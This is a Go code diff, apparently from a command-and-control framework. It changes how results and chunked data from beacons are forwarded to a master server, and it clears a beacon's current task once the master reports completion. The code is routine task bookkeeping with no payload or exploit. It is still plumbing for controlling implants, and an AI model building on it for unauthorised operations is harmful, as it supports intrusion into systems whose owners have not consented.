@@ -1107,13 +1107,24 @@ func (c2 *C2Manager) handleResult(parts []string, isDuplicate bool) string {
 					submitTaskID = masterTaskID
 				}
 
-				_ = masterClient.SubmitResult(submitTaskID, bid, 0, 1, res)
+				taskComplete, err := masterClient.SubmitResult(submitTaskID, bid, 0, 1, res)
+				if err == nil && taskComplete {
+					// Master signaled task is complete - clear from beacon's current task
+					c2.mutex.Lock()
+					if beacon, exists := c2.beacons[bid]; exists {
+						if beacon.CurrentTask == tid {
+							beacon.CurrentTask = ""
+							if c2.debug {
+								logf("[C2] Task %s completed, cleared from beacon %s CurrentTask", tid, bid)
+							}
+						}
+					}
+					c2.mutex.Unlock()
+				}
 			}(taskID, beaconID, result)
 		}
 		return "ACK"
-	}
-
-	// Log receipt of result (include small preview) - skip for duplicates
+	} // Log receipt of result (include small preview) - skip for duplicates
 	if !isDuplicate {
 		preview := result
 		if len(preview) > ResultPreviewMaxLength {
@@ -1195,10 +1206,23 @@ func (c2 *C2Manager) handleResult(parts []string, isDuplicate bool) string {
 				submitTaskID = masterTaskID
 			}
 
-			if err := masterClient.SubmitResult(submitTaskID, bid, 0, 1, res); err != nil {
+			taskComplete, err := masterClient.SubmitResult(submitTaskID, bid, 0, 1, res)
+			if err != nil {
 				if c2.debug {
 					logf("[C2] Failed to submit result to master: %v", err)
 				}
+			} else if taskComplete {
+				// Master signaled task is complete - clear from beacon's current task
+				c2.mutex.Lock()
+				if beacon, exists := c2.beacons[bid]; exists {
+					if beacon.CurrentTask == tid {
+						beacon.CurrentTask = ""
+						if c2.debug {
+							logf("[C2] Task %s completed, cleared from beacon %s CurrentTask", tid, bid)
+						}
+					}
+				}
+				c2.mutex.Unlock()
 			}
 
 			// Clean up master task ID mapping after successful submission
@@ -1368,12 +1392,27 @@ func (c2 *C2Manager) handleData(parts []string, isDuplicate bool) string {
 			}
 
 			// Forward chunk to Master for reassembly
-			if err := masterClient.SubmitResult(submitTaskID, bid, chunkIdx, total, chunkData); err != nil {
+			taskComplete, err := masterClient.SubmitResult(submitTaskID, bid, chunkIdx, total, chunkData)
+			if err != nil {
 				if c2.debug {
 					logf("[C2] Failed to forward chunk to master: %v", err)
 				}
-			} else if c2.debug && chunkIdx%10 == 0 {
-				logf("[C2] Forwarded chunk %d/%d to Master for task %s", chunkIdx, total, submitTaskID)
+			} else {
+				if taskComplete {
+					// Master signaled task is complete - clear from beacon's current task
+					c2.mutex.Lock()
+					if beacon, exists := c2.beacons[bid]; exists {
+						if beacon.CurrentTask == tid {
+							beacon.CurrentTask = ""
+							if c2.debug {
+								logf("[C2] Task %s completed (after chunk %d/%d), cleared from beacon %s CurrentTask", tid, chunkIdx, total, bid)
+							}
+						}
+					}
+					c2.mutex.Unlock()
+				} else if c2.debug && chunkIdx%10 == 0 {
+					logf("[C2] Forwarded chunk %d/%d to Master for task %s", chunkIdx, total, submitTaskID)
+				}
 			}
 		}(taskID, beaconID, chunkIndex, totalChunks, data)
 	} // Local tracking for fallback/redundancy (but don't rely on it for Shadow Mesh)
